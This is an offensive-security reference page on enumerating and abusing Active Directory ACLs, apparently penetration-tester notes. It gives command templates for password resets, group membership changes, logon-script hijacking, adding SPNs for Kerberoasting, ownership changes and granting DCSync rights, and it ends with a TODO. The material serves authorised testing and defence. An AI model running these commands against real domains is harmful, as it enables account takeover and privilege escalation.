# Active Directory - Exploiting Access Control Lists (ACL)

### Overview

Every Active Directory security principal object, uniquely identified by a
`Security Identifier (SID)` across a domain, has a security descriptor, which
dictates the trustees that are granted permissions over the object.

The security descriptor is formatted according to the `Security Descriptor
Definition Language (SDDL)` and will usually be divided into two types of
`ACL`:
  - A `Discretionary Access Control List (DACL)` which define the trustees
  that are allowed or denied permissions to the object
  - A `System Access Control List (SACL)` which can be used to log attempts to
  access the object.    

The `SDDL` uses `Access Control Entry (ACE)` strings in the `DACL` and `SACL`
components of a security descriptor string. Each `ACE` in a security descriptor
string is composed of a trustee SID and an access mask defining their
associated permissions / access rights. Moreover, a bit flag determine whether
child containers or objects can inherit the ACE from the primary object to
which the ACL is attached.

Each `ACE` in the `SACL` specifies the types of access attempts by a
specified trustee that cause the system to generate a record in the security
event log.

### Enumeration of DACL

###### Unitary enumeration

`DSACLS.exe` or `Get-ACL` from the `Remote Server Administration Tools (RSAT)`
and `PowerView`'s `Get-ObjectAcl` can be used to enumerate the `DACL` of an
Active Directory object:

```
dsacls.exe <DistinguishedName>

Get-ACL -path "AD:<DistinguishedName>" | Select -ExpandProperty Access

Get-ObjectAcl -Identity <SamAccountName | DistinguishedName | SID | GUID>
Get-ObjectAcl -Identity <SamAccountName | DistinguishedName | SID | GUID> -Server <DC_HOSTNAME | DC_IP> -Domain <DOMAIN> -Credential <PS_CREDENTIALS>

# List ACE of the specified user on the specified object
$UserSID = Get-DomainUser -Identity <SamAccountName | DistinguishedName | SID | GUID> | Select-Object -ExpandProperty objectsid
Get-ObjectAcl -Identity <SamAccountName | DistinguishedName | SID | GUID> -ResolveGUIDs | ? {$_.securityidentifier -eq $UserSID}
```

###### Domain-wide automated enumeration

The `BloodHound` ingestor `SharpHound` (`ACL` or `All` collection methods)
and the `PingCastle`'s `compromise graph` can be used to automatically
enumerate security objects `DACL` in order to find exploitable paths.
Refer to the `Active Directory - AD scanners` note for more information.

`PowerView` can also be used for domain-wide enumeration and filtering on
potentially exploitable `ACEs`. The absence of multi-threading however prevents
the use of such queries on larger Active Directory domains.

`Grouper2` can also be used, notably in a more thorough review of GPO
including the definition of user rights (`Active Directory - GPO users rights`)
and permissions on scripts and MSI packages executed / deployed through GPO.

```
Grouper2.exe -g -f <OUTPUT_HTML>
Grouper2.exe -u "<USERNAME>" -p "<PASSWORD>" -s "\\<DC_HOSTNAME | DC_IP>\SYSVOL" -g -f <OUTPUT_HTML>
```

The exploitable permissions, presented below, are of particular interest if
attributed for one of the following groups:
  - `Everyone`, SID: `S-1-1-0`
  - `Authenticated Users`, SID: `S-1-5-11`
  - `Domain Users`, SID: `S-1-5-<DOMAIN>-513`

```
# [ALL]
# Enumeration of exploitable ACE on all AD objects defined for the Everyone, Authenticated Users and Domain Users groups
# Get-DomainObjectAcl -Server <DC_HOSTNAME | DC_IP> -Credential <PSCredential> | ? { (($_.SecurityIdentifier -eq 'S-1-1-0') -or ($_.SecurityIdentifier -eq 'S-1-5-11') -or ($_.SecurityIdentifier -like 'S-1-5-*-513')) -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}

# [GPO]
# Enumeration of exploitable ACE on GPO objects defined for the Everyone, Authenticated Users and Domain Users groups
# Get-DomainObjectAcl -Server <DC_HOSTNAME | DC_IP> -Credential <PSCredential>  -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { (($_.SecurityIdentifier -eq 'S-1-1-0') -or ($_.SecurityIdentifier -eq 'S-1-5-11') -or ($_.SecurityIdentifier -like 'S-1-5-*-513')) -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}

# [GPO]
# Enumeration on exploitable ACE on GPO objects for non-default users (RID >= 1000)
Get-DomainObjectAcl -Server <DC_HOSTNAME | DC_IP> -Credential <PSCredential> -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}
```

### Users and groups permissions exploitation

###### Summary

The following access rights can be exploited with `PowerView`:

| Object type | ACE | Description |
|-------------|-----|-------------|
| User | `GenericAll` | Full rights on the security object (including `WriteOwner` and `WriteDacl`), can be used to change the user password. |
| User | `GenericWrite` | Ability to update any non-protected object (almost) all properties values. Similar to `WriteProperty` to `all properties`. |
| User | `ForceChangePassword` | Ability to change the user password. |
| User | `AllExtendedRights` | Ability to perform any action associated with extended Active Directory rights against the object, can be used to change the user password. |
| User | `WriteOwner` | Ability to change the owner of the user, thus granting complete control over the user and notably the ability to change the user's password. |
| User | `WriteDacl` | Ability to change the DACL of the user, thus granting complete control over the user and notably the ability to add ACE to change the user's password. |
| User | `WriteProperty` to `all properties` | Ability to update any non-protected user properties values and notably update the `Script-Path` or `servicePrincipalName` properties. |
| User | `WriteProperty` to `Script-Path` | Ability to update any non-protected user logon script path which will be executed on the system upon user logon. |
| User | `WriteProperty` to `servicePrincipalName` | Ability to define or update any non-protected user servicePrincipalName, which exposes the account to Kerberoasting. |
| Group | `GenericAll` | Full rights on the security object (including `WriteOwner` and `WriteDacl`), can be used to add an user to the group. |
| Group | `GenericWrite` | Ability to update any non-protected object (almost) all properties values. Similar to `WriteProperty` to `all properties`. |
| Group | `AddMembers` | Ability to add other security objects to the group. |
| Group | `AllExtendedRights` | Ability to perform any action associated with extended Active Directory rights against the object, can be used to add others security objects to the group. |
| Group | `Self (Self-Membership)` | Ability to update any non-protected group members by adding/removing one's own account to the group. |
| Group | `WriteOwner` | Ability to change the owner of the group, thus granting complete control over the group and notably the ability to add others security objects to the group. |
| Group | `WriteDacl` | Ability to change the DACL of the group, thus granting complete control over the group and notably the ability to add others security objects to the group. |
| Group | `WriteProperty` to `all properties` | Ability to update any non-protected group properties values and notably the member property, thus allowing to add others security objects to the group. |
| Group | `WriteProperty` to the `member` or `Self-Membership` properties | Ability to update any non-protected group members, thus allowing to add others security objects to the group. |

###### User - GenericAll / ForceChangePassword / AllExtendedRights / WriteProperty to all properties

`net user`, `RSAT`'s `Set-ADAccountPassword`, and `PowerView`'s
`Set-DomainUserPassword` can be used to change the vulnerable user's password:

```
net user <USERNAME> NewPassword123! /domain

Set-ADAccountPassword -Identity <SamAccountName | DistinguishedName | SID | GUID> -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "<PASSWORD>" -Force)
Set-ADAccountPassword -Server <DC_HOSTNAME | DC_IP> -Credential <PS_CREDENTIALS> -Identity <SamAccountName | DistinguishedName | SID | GUID> -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "<PASSWORD>" -Force)

$UserPassword = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force
Set-DomainUserPassword -Identity <SamAccountName | DistinguishedName | SID | GUID> -AccountPassword $UserPassword
Set-DomainUserPassword -Domain <DOMAIN> -Credential <PS_CREDENTIALS> -Identity <SamAccountName | DistinguishedName | SID | GUID> -AccountPassword $UserPassword
```

###### User - WriteProperty to Script-Path

The `RSAT`'s `Set-ADObject` and `PowerView`'s `Set-DomainObject` can be used to
modify the properties of a security object.

```
Set-ADObject -Identity <SamAccountName | DistinguishedName | SID | GUID> [-Add / -Replace] @{scriptpath="\\<IP>\<SHARE>\<SCRIPT>"}
Set-ADObject -Server <DC_HOSTNAME | DC_IP> -Credential <PS_CREDENTIALS> -Identity <SamAccountName | DistinguishedName | SID | GUID> [-Add / -Replace] @{scriptpath="\\<IP>\<SHARE>\<SCRIPT>"}

Set-DomainObject -Identity <SamAccountName | DistinguishedName | SID | GUID> -Set @{scriptpath="\\<IP>\<SHARE>\<SCRIPT>"}
Set-DomainObject -Server <DC_HOSTNAME | DC_IP> -Credential <PS_CREDENTIALS> -Identity <SamAccountName | DistinguishedName | SID | GUID> -Set @{scriptpath="\\<IP>\<SHARE>\<SCRIPT>"}
```

###### User - WriteProperty to servicePrincipalName

`RSAT`'s `Set-ADUser` can be used to define or update the specified user
servicePrincipalName.

```
# SPN example: SQLservice\accounting.corp.contoso.com:1456
Set-ADUser -Identity <SamAccountName | DistinguishedName | SID | GUID> -ServicePrincipalNames @{Add="<SPN>"}"}
```

###### Group - GenericAll / GenericWrite / AddMembers / AllExtendedRights / WriteProperty to all properties / WriteProperty to the member or Self-Membership properties / Self (Self-Membership)

Generic Write access grants the ability to write to any non-protected attribute
on the target object, including "members" for a group.

`net group`, `RSAT`'s `Add-ADGroupMember`, and `PowerView`'s
`Add-DomainGroupMember` can be used to add others security objects to the
specified group.

```
net group "<GROUP>" <USERNAME> /add /domain

Add-ADGroupMember -Identity "<GROUP>" -Members [<SamAccountName | DistinguishedName | SID | GUID>, ...]
Add-ADGroupMember -Server <DC_HOSTNAME | DC_IP> -Domain <DOMAIN> -Credential <PS_CREDENTIALS> -Identity "<GROUP>" -Members <USERNAME>

Add-DomainGroupMember -Identity "<GROUP>" -Members [<SamAccountName | DistinguishedName | SID | GUID>, ...]
Add-DomainGroupMember -Domain <DOMAIN> -Credential <PS_CREDENTIALS> -Identity "<GROUP>" -Members [<SamAccountName | DistinguishedName | SID | GUID>, ...]
```

###### User / group - WriteOwner

`PowerView`'s `Set-DomainObjectOwner` can be used to change the owner of a
security object. Being the owner of an user can be leveraged to change the
user password and being the owner of a group can allows for the addition of
others security objects to the group.

```
Set-DomainObjectOwner -Verbose -Identity <SamAccountName | DistinguishedName | SID | GUID> -OwnerIdentity <SamAccountName | DistinguishedName | SID | GUID>
Set-DomainObjectOwner -Verbose -Server <DC_HOSTNAME | DC_IP> -Domain <DOMAIN> -Credential <PS_CREDENTIALS> -Identity <SamAccountName | DistinguishedName | SID | GUID> -OwnerIdentity <SamAccountName | DistinguishedName | SID | GUID> -Verbose

# Once the user / group owner is changed, the GenericAll privilege can be granted to users using the new owner identity
# Refer to the "User - GenericAll" and "Group - GenericAll" parts for further exploitation
Add-DomainObjectAcl -PrincipalIdentity <SamAccountName | DistinguishedName | SID | GUID> -TargetIdentity <SamAccountName | DistinguishedName | SID | GUID> -Rights All
```

###### User / group - WriteDacl

`PowerView`'s `Add-DomainObjectAcl` can be used to modify the specified object
ACE by adding the following rights: `All`, `ResetPassword`, `WriteMembers`,
`DCSync` (default to `All`) to the specified security object.

```
# TargetIdentity: security object that will be modified
# PrincipalIdentity: security object that will be given the right over the targeted object

Add-DomainObjectAcl -Verbose -TargetIdentity <SamAccountName | DistinguishedName | SID | GUID> -PrincipalIdentity <SamAccountName | DistinguishedName | SID | GUID> -Rights <All | ResetPassword | WriteMembers | DCSync>
Add-DomainObjectAcl -Verbose -Server <DC_HOSTNAME | DC_IP> -Credential <PS_CREDENTIALS> -TargetIdentity <SamAccountName | DistinguishedName | SID | GUID> -PrincipalIdentity <SamAccountName | DistinguishedName | SID | GUID> -Rights <All | ResetPassword | WriteMembers | DCSync>
```

### Automated exploitation

The PowerShell cmdlet `Invoke-ACLpwn`, leveraging `SharpHound.exe` and thus
`.NET 3.5`, can be used to exhaustively enumerate the domain security principal
objects `DACLs` and find potential paths leading to privileges escalation.

Note that `Invoke-ACLpwn` will actively add the specified user to security
groups it has control over.

```
Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe

Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -Domain '<DOMAIN>' -Username '<USERNAME>' -Password '<PASSWORD>'
```

### GPO ACEs exploitation

###### GPO enforcement

GPO can be linked to an Organizational Unit (OU) but not necessarily applied,
as an OU can `blocks inheritance` on an not `enforced` GPO or a conflicting GPO
with a higher precedence order may supplant the exploitable GPO.

The precedence order respect the principle that, in case of conflicting
settings in GPOs, the last GPO applied will overwrite any settings applied
earlier and the GPO closest to the client location in the directory structure
will be applied last. Concretely, the precedence order is as follow (from the
applied first / lowest in the precedence order to the applied last / highest in
the precedence order):
  - local GPO
  - site GPO
  - domain GPO
  - OU (for nested OU, the GPO closer to the object being the highest in the
    precedence order)

Others mechanisms, such as `WMI filtering` (which restrains the application of
the GPO depending on the result of a true / false WMI query), or `Security
filtering` (which restrains to specific members - users and groups - of
security groups) may further influence the GPO enforcement.

For now, `BloodHound` takes into account the `block inheritance` / `enforced`
mechanism but not the precedence order nor the `WMI filtering` and `security
filtering`.

###### Exploitable ACEs

TODO
